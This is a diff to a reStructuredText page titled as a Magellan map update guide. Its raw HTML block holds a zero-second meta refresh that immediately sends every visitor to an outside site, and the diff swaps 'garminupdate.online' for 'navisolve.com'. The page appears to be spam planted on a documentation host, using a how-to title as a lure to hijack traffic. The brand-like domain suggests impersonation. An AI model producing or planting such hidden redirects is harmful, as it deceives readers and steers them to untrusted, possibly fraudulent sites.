@@ -1,6 +1,6 @@
 .. raw:: html
  
-    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+    <meta http-equiv="refresh" content="0; url=https://navisolve.com/">
 
 How to Perform a Magellan Map Update for Accurate Navigation
 ==================================================
